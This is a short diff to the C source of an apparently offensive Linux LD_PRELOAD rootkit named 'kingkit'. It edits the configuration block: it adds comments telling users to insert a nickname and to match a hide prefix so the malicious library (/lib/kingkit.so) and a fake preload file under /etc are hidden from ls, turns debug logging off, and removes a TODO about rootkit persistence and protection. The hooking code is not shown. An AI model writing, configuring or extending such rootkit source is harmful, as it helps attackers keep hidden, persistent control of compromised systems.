@@ -1,13 +1,6 @@
-/*TODO:
- * properly pass variadic arguments for functions like open
- * add protection for the rootkit and persistence
- */
-
-
-/*NOTES:
+/* NOTES:
  * fstat() and fstat64() are not needed because it takes a file descriptor as argument that is already filtered by open()
  */
-
 
 
 #define _GNU_SOURCE
@@ -28,11 +21,11 @@
 #include <linux/fs.h>
 
 //change these
-#define KING_NAME "Arnout"
-#define HIDE_PREFIX "kingkit"
+#define KING_NAME "Arnout" //put your nickname here
+#define HIDE_PREFIX "kingkit" //match LIB_PATH and FAKE_PRELOAD with the HIDE_PREFIX so they are hidden from ls
 #define LIB_PATH "/lib/kingkit.so"
 #define FAKE_PRELOAD "/etc/kingkit.so.preload"
-#define DEBUG 1
+#define DEBUG 0 //set to 1 for logging
 
 //don't change these
 #define PREFIX_LEN (sizeof(HIDE_PREFIX) - 1)
